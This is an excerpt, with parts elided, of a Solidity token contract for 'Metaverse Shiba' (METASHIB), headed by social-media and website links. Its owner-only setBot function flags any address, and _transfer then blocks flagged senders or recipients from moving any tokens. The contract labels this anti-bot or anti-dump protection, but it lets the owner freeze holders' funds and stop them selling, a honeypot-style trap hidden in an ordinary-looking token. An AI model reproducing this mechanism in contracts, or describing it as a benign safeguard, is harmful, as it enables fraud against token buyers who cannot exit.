/**
*   ______  ____________________________    ___________________________________
*   ___   |/  /__  ____/__  __/__    |_ |  / /__  ____/__  __ \_  ___/__  ____/
*   __  /|_/ /__  __/  __  /  __  /| |_ | / /__  __/  __  /_/ /____ \__  __/   
*   _  /  / / _  /___  _  /   _  ___ |_ |/ / _  /___  _  _, _/____/ /_  /___   
*   /_/  /_/  /_____/  /_/    /_/  |_|____/  /_____/  /_/ |_| /____/ /_____/   
*                                                      Shiba Project
*
*    Telegram -  https://t.me/MetaverseShiba
*
*    Telegram news - https://t.me/MetaShibaNews
*   
*    Website -  https://metaverseshiba.net/
*    
*    Twitter -  https://twitter.com/metaverse_shiba
*/                                                            
...
contract MetaverseShiba is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = 'Metaverse Shiba';
    string private _symbol = 'METASHIB';
    uint256 private constant _tTotal = 1000000000000000*10**9;
    uint8 private _decimals = 9;
    string public TaxSlippage = "5%";
    ...
    function setBot(address _address) external onlyOwner {
        if (_antiDump[_address] == true) {_antiDump[_address] = false;}
        else {_antiDump[_address] = true; 
        emit bannedBot (_address, _antiDump[_address]);}
    }

    function checkBot(address _address) public view returns (bool) {
        return _antiDump[_address];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_antiDump[sender] || _antiDump[recipient]) require (amount == 0, "");
